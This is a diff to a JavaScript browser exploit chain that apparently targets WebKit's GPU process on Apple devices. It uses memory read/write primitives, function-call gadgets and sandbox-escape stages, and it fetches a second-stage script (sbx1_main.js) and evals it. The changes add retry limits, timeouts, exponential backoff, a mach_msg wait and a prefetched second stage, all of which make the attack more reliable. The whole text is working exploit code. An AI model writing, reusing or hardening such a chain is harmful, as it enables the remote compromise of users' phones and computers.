@@ -6718,17 +6718,22 @@
         }
       }
     }
-    receiveMessage(messageName) {
+    receiveMessage(messageName, maxRetries = 20) {
+      let retries = 0;
       while (1) {
         const decoder = this.tryReceiveMessage();
         if (decoder.messageName == messageName) {
           return decoder;
         }
+        if (++retries > maxRetries) {
+          ASSERT_NOT_REACHED(`receiveMessage(${messageName.toString(16)}): exceeded ${maxRetries} retries`);
+        }
       }
     }
-    receiveMessages(messageNames) {
+    receiveMessages(messageNames, maxRetries = 50) {
       const result = new Array(messageNames.length);
       let count = 0;
+      let retries = 0;
       while (1) {
         const decoder = this.tryReceiveMessage();
         for (let i = 0; i < result.length; ++i) {
@@ -6741,12 +6746,19 @@
             }
           }
         }
+        if (++retries > maxRetries) {
+          ASSERT_NOT_REACHED(`receiveMessages: exceeded ${maxRetries} retries, got ${count}/${messageNames.length}`);
+        }
       }
     }
-    receiveSyncReply(syncRequestID) {
+    receiveSyncReply(syncRequestID, maxRetries = 20) {
+      let retries = 0;
       while (1) {
         const decoder = this.receiveMessage(MessageName.SyncMessageReply);
         if (decoder.decode('uint64_t') == syncRequestID) return decoder;
+        if (++retries > maxRetries) {
+          ASSERT_NOT_REACHED(`receiveSyncReply(${syncRequestID}): exceeded ${maxRetries} retries`);
+        }
       }
     }
     sendMessage(encoder, attachments = []) {
@@ -7019,7 +7031,7 @@
   function nextIdentifier() {
     return identifier++;
   }
-  const crash_timeout = 100;
+  const crash_timeout = 200;
   const runLoopHolder_tid = read64(offsets.runLoopHolder_tid);
   LOG(`runLoopHolder_tid: ${runLoopHolder_tid.hex()}`);
   const webProcess = read64(offsets.WebProcess_singleton);
@@ -7590,9 +7602,20 @@
       if (!RemoteDisplayListRecorder_FillRect(imageBufferIdentifiers[dirtyWriteIndex + 3], 0, 0, 0, 0, true, timeout = crash_timeout)) return false;
       return true;
     }
+    const _yieldBuf = new ArrayBuffer(0x40);
+    const _yieldBufPtr = _yieldBuf.data();
+    const _yieldPortBuf = new BigUint64Array(1);
+    fcall(offsets.mach_port_allocate, __mach_task_self, 1n, _yieldPortBuf.data());
+    const _yieldPort = _yieldPortBuf[0];
+    function yieldWait(ms) {
+      fcall(offsets.mach_msg_fn, _yieldBufPtr,
+            0x102n, 0n, 0x40n,
+            _yieldPort, BigInt(ms), 0n);
+    }
     function iterativeRead(address, size) {
-      const max_attempts = 4;
+      const max_attempts = 8;
       let last_leak_size = 0;
+      let backoff = 5;
       for (let attempt = 0; attempt < max_attempts; attempt++) {
         if (dirty_read_count++ != 0) {
           if (!RemoteDisplayListRecorder_DrawGlyphs(imageBufferIdentifiers[dirtyWriteIndex + 1], cache_id, new Uint8Array(0x10), new Uint8Array(0x80), 8, timeout = crash_timeout)) return false;
@@ -7607,7 +7630,8 @@
         }
         last_leak_size = leak.byteLength;
         LOG(`iterativeRead retry ${attempt + 1}/${max_attempts}: expected ${size}, actual ${leak.byteLength}`);
-        sleep(5);
+        yieldWait(backoff);
+        backoff = Math.min(backoff * 2, 640);
       }
       crashGPUProcess(`leak size mismatch (expected: ${size}, actual: ${last_leak_size})`);
       return false;
@@ -7827,7 +7851,7 @@
       const res = new Map();
       for (let offset = 0n; offset < buffer_size; offset += entry_size) {
         const key = map_buffer_u64[offset / 8n];
-        if (key) {
+        if (key && key != 0xffffffffffffffffn) {
           const value = map_buffer_u64[(offset + key_size) / 8n];
           res.set(key, value);
         }
@@ -7964,9 +7988,17 @@
     LOG(`stack_bottom: ${stack_bottom.hex()}`);
     const stack_top = gpu_slow_read64(backend2_processingThread + 0x18n);
     LOG(`stack_top: ${stack_top.hex()}`);
-    while (true) {
-      const lr = gpu_slow_read64(stack_bottom - 0x18c8n) & 0xffff_ffffn;
-      if (lr == dlopen_from_lambda_ret) break;
+    {
+      const mutex_wait_begin = performance.now();
+      while (true) {
+        const lr = gpu_slow_read64(stack_bottom - 0x18c8n) & 0xffff_ffffn;
+        if (lr == dlopen_from_lambda_ret) break;
+        if (performance.now() - mutex_wait_begin > 10000) {
+          crashGPUProcess('mutex lock timeout (backend2)');
+          return respawn_gpu_process_and_retry();
+        }
+        sleep(10);
+      }
     }
     LOG('RemoteRenderingBackend2 has been mutex-locked');
     const loader = stack_bottom - 0x18c8n + 0x78n;
@@ -8010,13 +8042,20 @@
     gpu_slow_write64(offsets.libsystem_c__atexit_mutex + 0x20n, 0x101n);
     gpu_slow_write64(imageBuffer3 + 0x20n, offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisVoice);
     RemoteRenderingBackend_ReleaseImageBuffer(backendConnection3, imageBufferIdentifier3);
-    while (true) {
-      const InterposeTupleAll_buffer = gpu_slow_read64(p_InterposeTupleAll_buffer);
-      if (InterposeTupleAll_buffer) {
-        LOG(`InterposeTupleAll_buffer: ${InterposeTupleAll_buffer.hex()}`);
-        break;
+    {
+      const interpose_wait_begin = performance.now();
+      while (true) {
+        const InterposeTupleAll_buffer = gpu_slow_read64(p_InterposeTupleAll_buffer);
+        if (InterposeTupleAll_buffer) {
+          LOG(`InterposeTupleAll_buffer: ${InterposeTupleAll_buffer.hex()}`);
+          break;
+        }
+        if (performance.now() - interpose_wait_begin > 15000) {
+          crashGPUProcess('interpose tuple write-back timeout (backend2)');
+          return respawn_gpu_process_and_retry();
+        }
+        sleep(10);
       }
-      sleep(10);
     }
     LOG(`RemoteRenderingBackend2 has been spin-locked`);
     gpu_slow_write64(offsets.libsystem_c__atexit_mutex + 0x20n, 0x102n);
@@ -8037,10 +8076,17 @@
     LOG(`backend3_stack_bottom: ${backend3_stack_bottom.hex()}`);
     const backend3_stack_top = gpu_slow_read64(backend3_processingThread + 0x18n);
     LOG(`backend3_stack_top: ${backend3_stack_top.hex()}`);
-    while (true) {
-      const lr = gpu_slow_read64(backend3_stack_bottom - 0x17a8n) & 0xffff_ffffn;
-      if (lr == dlopen_from_lambda_ret) break;
-      sleep(10);
+    {
+      const mutex_wait_begin = performance.now();
+      while (true) {
+        const lr = gpu_slow_read64(backend3_stack_bottom - 0x17a8n) & 0xffff_ffffn;
+        if (lr == dlopen_from_lambda_ret) break;
+        if (performance.now() - mutex_wait_begin > 10000) {
+          crashGPUProcess('mutex lock timeout (backend3)');
+          return respawn_gpu_process_and_retry();
+        }
+        sleep(10);
+      }
     }
     LOG('RenderingBackend3 has been mutex-locked');
     const backend3_loader = backend3_stack_bottom - 0x17a8n + 0x78n;
@@ -8056,10 +8102,17 @@
     gpu_slow_write64(offsets.CFNetwork__gConstantCFStringValueTable + 0x18n, 0x5en);
     gpu_slow_write64(imageBuffer5 + 0x20n, offsets.AVFAudio__OBJC_CLASS__AVSpeechUtterance);
     RemoteRenderingBackend_ReleaseImageBuffer(backendConnection4, imageBufferIdentifier5);
-    while (true) {
-      const ptr = gpu_slow_read64(p_InterposeTupleAll_size);
-      if (ptr === 0x100n) break;
-      sleep(10);
+    {
+      const interpose_wait_begin = performance.now();
+      while (true) {
+        const ptr = gpu_slow_read64(p_InterposeTupleAll_size);
+        if (ptr === 0x100n) break;
+        if (performance.now() - interpose_wait_begin > 15000) {
+          crashGPUProcess('interpose size write-back timeout (backend3)');
+          return respawn_gpu_process_and_retry();
+        }
+        sleep(10);
+      }
     }
     LOG('RenderingBackend3 has been spin-locked');
     let fontIdentifier = 0x1234n;
@@ -8662,12 +8715,27 @@
         const gpuFcallDisableSleep = gpu_fcall_disable_sleep;
         const addrof = p.addrof;
         const sc_slide = p.slide;
-        const sbx1_script = getJS('/sbx1_main.js?' + Date.now());
+        LOG(`[i] preparing SBX1 handoff`);
+        let sbx1_script = p.prefetched_sbx1_script;
+        if (sbx1_script && sbx1_script.length > 0) {
+          LOG(`[i] using prefetched sbx1_main.js (${sbx1_script.length} bytes)`);
+        } else {
+          LOG(`[i] prefetched sbx1_main.js missing, fetching inline`);
+          sbx1_script = getJS('sbx1_main.js?' + Date.now());
+        }
+        if (!sbx1_script || sbx1_script.length === 0) {
+          LOG(`[x] sbx1_main.js fetch returned empty`);
+          throw new Error('sbx1_main.js fetch returned empty');
+        }
+        LOG(`[i] sbx1_main.js ready (${sbx1_script.length} bytes)`);
         print("sbx1 fetched, length: " + (sbx1_script ? sbx1_script.length : "null"));
         try {
+          LOG(`[i] evaluating sbx1_main.js`);
           eval(sbx1_script);
+          LOG(`[i] sbx1_main.js eval returned`);
           print("sbx1 eval completed successfully");
         } catch(sbx1_err) {
+          LOG(`[x] sbx1_main.js eval threw: ${sbx1_err}`);
           print("SBX1 ERROR: " + sbx1_err, true);
           print("SBX1 ERROR stack: " + (sbx1_err.stack || "no stack"), true);
         }
@@ -8679,17 +8747,26 @@
         sbx1_end = Date.now();
         log(`[profiler] sbx1 took ${sbx1_end - sbx0_pac_end} ms`);
         LOG(`[+] SBX1 complete`);
-        LOG('Invalidate backend connection from gpu process side');
+        const preserveBackendConnectionAfterSuccess =
+          p.repro_preserve_backend_connection_after_success === true;
         const remoteRenderingBackendMap = gpu_read64(myWebProcessConnection + 0xe8n);
         LOG(`remoteRenderingBackendMap: ${remoteRenderingBackendMap.hex()} `);
         const remoteGraphicsContextGLMap = gpu_read64(myWebProcessConnection + 0xf0n);
         LOG(`remoteGraphicsContextGLMap: ${remoteGraphicsContextGLMap.hex()} `);
-        gpu_write64(myWebProcessConnection + 0xe8n, 0n);
-        gpu_write64(myWebProcessConnection + 0xf0n, 0n);
-        LOG('Invalidated');
+        if (preserveBackendConnectionAfterSuccess) {
+          LOG('[repro] Preserving backend connection for same-boot reruns');
+          LOG('[repro] Skipped backend invalidation after successful chain');
+        } else {
+          LOG('[repro] Using original backend invalidation path for PE-stage trigger');
+          LOG('Invalidate backend connection from gpu process side');
+          gpu_write64(myWebProcessConnection + 0xe8n, 0n);
+          gpu_write64(myWebProcessConnection + 0xf0n, 0n);
+          LOG('Invalidated');
+        }
         //LOG("Calling _exit()");
         //fcall(offsets.exit, 0n);
 
+        LOG('[i] closing gpu_fcall thread');
         gpu_fcall_close();
       } catch (e) {
         print("SBX0 OUTER ERROR: " + e, true);
